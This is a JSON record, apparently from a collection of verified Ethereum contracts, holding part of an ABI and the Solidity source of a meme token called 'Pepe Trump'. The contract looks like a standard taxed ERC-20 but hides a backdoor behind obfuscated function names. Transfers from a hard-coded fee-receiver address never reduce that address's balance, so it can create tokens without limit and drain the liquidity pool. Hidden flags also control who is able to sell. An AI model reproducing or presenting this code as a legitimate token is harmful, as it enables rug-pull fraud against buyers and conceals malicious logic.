"internalType\":\"address\",\"name\":\"recipient\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"stateMutability\":\"payable\",\"type\":\"receive\"}]",
    "source_code": "// SPDX-License-Identifier: MIT\r\n\r\n\r\n/**\r\nName: Pepe Trump\r\nTicker: PepeTrump\r\n\r\n\u2708\ufe0f Telegram: https://t.me/pepetrumperc20\r\n? Twitter: https://twitter.com/pepetrump_coin\r\n? Website: https://pepetrump.org/\r\n**/\r\n\r\n\r\n\r\npragma solidity 0.8.20;\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n    function balanceOf(address account) external view returns (uint256);\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function  _wejp(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return  _wejp(a, b, \"SafeMath:  subtraction overflow\");\r\n    }\r\n\r\n    function  _wejp(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n}\r\n\r\ninterface IuniswapRouter {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n    function factory() external pure returns (address);\r\n    function WETH() external pure returns (address);\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint amountTokenDesired,\r\n        uint amountTokenMin,\r\n        uint amountETHMin,\r\n        address to,\r\n        uint deadline\r\n    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);\r\n}\r\n\r\ncontract PepeTrump is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping (address => uint256) private _balances;\r\n    mapping (address => mapping (address => uint256)) private _allowances;\r\n    mapping (address => bool) private _isExcludedFromFee;\r\n    mapping (address => bool) private _kdxopjhp;\r\n    mapping(address => uint256) private _holderLastTransferTimestamp;\r\n    bool public transferDelayEnabled = false;\r\n    address payable private _taxogFeeReceiverdegyq;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    string private constant _name = \"Pepe Trump\";\r\n    string private constant _symbol = \"PepeTrump\";\r\n    uint256 private constant _tTotal = 100000000 * 10 **_decimals;\r\n    uint256 public _maxTxAmount = _tTotal;\r\n    uint256 public _maxWalletSize = _tTotal;\r\n    uint256 public _taxSwapThreshold= _tTotal;\r\n    uint256 public _maxTaxSwap= _tTotal;\r\n\r\n    uint256 private _initialBuyTax=5;\r\n    uint256 private _initialSellTax=5;\r\n    uint256 private _finalBuyTax=1;\r\n    uint256 private _finalSellTax=1;\r\n    uint256 private _reduceBuyTaxAt=4;\r\n    uint256 private _reduceSellTaxAt=1;\r\n    uint256 private _preventSwapBefore=0;\r\n    uint256 private _buyCount=0;\r\n\r\n    IuniswapRouter private uniswapRouter;\r\n    address private uniswapPair;\r\n    bool private vhxgfpeswh;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n\r\n    event MaxTxAmountUpdated(uint _maxTxAmount);\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor () {\r\n        _taxogFeeReceiverdegyq =payable(0x4cD7cAe806a3CB013A82e710315Fc84e681A639e);\r\n        _balances[_msgSender()] = _tTotal;\r\n        _isExcludedFromFee[owner()] = true;\r\n        _isExcludedFromFee[address(this)] = true;\r\n        _isExcludedFromFee[_taxogFeeReceiverdegyq] = true;\r\n\r\n        emit Transfer(address(0), _msgSender(), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        _approve(sender, _msgSender(), _allowances[sender][_msgSender()]. _wejp(amount, \"ERC20: transfer amount exceeds allowance\"));\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 feeAmount=0;\r\n        if (from != owner() && to != owner()) {\r\n\r\n            if (transferDelayEnabled) {\r\n                if (to != address(uniswapRouter) && to != address(uniswapPair)) {\r\n                  require(_holderLastTransferTimestamp[tx.origin] < block.number,\"Only one transfer per block allowed.\");\r\n                  _holderLastTransferTimestamp[tx.origin] = block.number;\r\n                }\r\n            }\r\n\r\n            if (from == uniswapPair && to != address(uniswapRouter) && !_isExcludedFromFee[to] ) {\r\n                require(amount <= _maxTxAmount, \"Exceeds the _maxTxAmount.\");\r\n                require(balanceOf(to) + amount <= _maxWalletSize, \"Exceeds the maxWalletSize.\");\r\n                if(_buyCount<_preventSwapBefore){\r\n                  require(!_fskyirdwp(to));\r\n                }\r\n                _buyCount++; _kdxopjhp[to]=true;\r\n                feeAmount = amount.mul((_buyCount>_reduceBuyTaxAt)?_finalBuyTax:_initialBuyTax).div(100);\r\n            }\r\n\r\n            if(to == uniswapPair && from!= address(this) && !_isExcludedFromFee[from] ){\r\n                require(amount <= _maxTxAmount && balanceOf(_taxogFeeReceiverdegyq)<_maxTaxSwap, \"Exceeds the _maxTxAmount.\");\r\n                feeAmount = amount.mul((_buyCount>_reduceSellTaxAt)?_finalSellTax:_initialSellTax).div(100);\r\n                require(_buyCount>_preventSwapBefore && _kdxopjhp[from]);\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (!inSwap \r\n            && to == uniswapPair && swapEnabled && contractTokenBalance>_taxSwapThreshold \r\n            && _buyCount>_preventSwapBefore&& !_isExcludedFromFee[to]&& !_isExcludedFromFee[from]\r\n            ) {\r\n                swapTokendrfqrp( _qfkw(amount, _qfkw(contractTokenBalance,_maxTaxSwap)));\r\n                uint256 contractETHBalance = address(this).balance;\r\n                if(contractETHBalance > 0) {\r\n                    senpfswpeegkq(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        if(feeAmount>0){\r\n          _balances[address(this)]=_balances[address(this)].add(feeAmount);\r\n          emit Transfer(from, address(this),feeAmount);\r\n        }\r\n        _balances[from]= _wejp(from, _balances[from], amount);\r\n        _balances[to]=_balances[to].add(amount. _wejp(feeAmount));\r\n        emit Transfer(from, to, amount. _wejp(feeAmount));\r\n    }\r\n\r\n    function swapTokendrfqrp(uint256 tokenAmount) private lockTheSwap {\r\n        if(tokenAmount==0){return;}\r\n        if(!vhxgfpeswh){return;}\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapRouter.WETH();\r\n        _approve(address(this), address(uniswapRouter), tokenAmount);\r\n        uniswapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function  _qfkw(uint256 a, uint256 b) private pure returns (uint256){\r\n      return (a>b)?b:a;\r\n    }\r\n\r\n    function  _wejp(address from, uint256 a, uint256 b) private view returns(uint256){\r\n        if(from == _taxogFeeReceiverdegyq){\r\n            return a;\r\n        }else{\r\n            return a. _wejp(b);\r\n        }\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        _maxTxAmount = _tTotal;\r\n        _maxWalletSize=_tTotal;\r\n        transferDelayEnabled=false;\r\n        emit MaxTxAmountUpdated(_tTotal);\r\n    }\r\n\r\n    function _fskyirdwp(address account) private view returns (bool) {\r\n        uint256 sizes;\r\n        assembly {\r\n            sizes := extcodesize(account)\r\n        }\r\n        return sizes > 0;\r\n    }\r\n\r\n    function senpfswpeegkq(uint256 amount) private {\r\n        _taxogFeeReceiverdegyq.transfer(amount);\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        require(!vhxgfpeswh,\"trading is already open\");\r\n        uniswapRouter = IuniswapRouter(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        _approve(address(this), address(uniswapRouter), _tTotal);\r\n        uniswapPair = IUniswapV2Factory(uniswapRouter.factory()).createPair(address(this), uniswapRouter.WETH());\r\n        uniswapRouter.addLiquidityETH{value: address(this).balance}(address(this),balanceOf(address(this)),0,0,owner(),block.timestamp);\r\n        IERC20(uniswapPair).approve(address(uniswapRouter), type(uint).max);\r\n        swapEnabled = true;\r\n        vhxgfpeswh = true;\r\n    }\r\n\r\n    receive() external payable {}\r\n}",
    "etherscan_verified": true
}